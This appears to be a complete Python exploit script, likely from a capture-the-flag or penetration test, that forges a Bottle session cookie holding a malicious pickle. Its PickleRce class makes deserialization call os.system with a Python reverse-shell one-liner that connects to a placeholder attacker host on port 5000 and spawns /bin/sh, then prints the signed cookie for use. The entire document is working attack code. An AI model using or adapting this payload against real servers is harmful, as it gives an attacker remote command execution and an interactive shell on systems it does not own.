from bottle import cookie_encode

secret = "xxxxx"
host = '<ip>'
port = 5000

command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'".format(host, port)


def main():
    session = cookie_encode(PickleRce(), secret)
    print(session)


class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))


main()
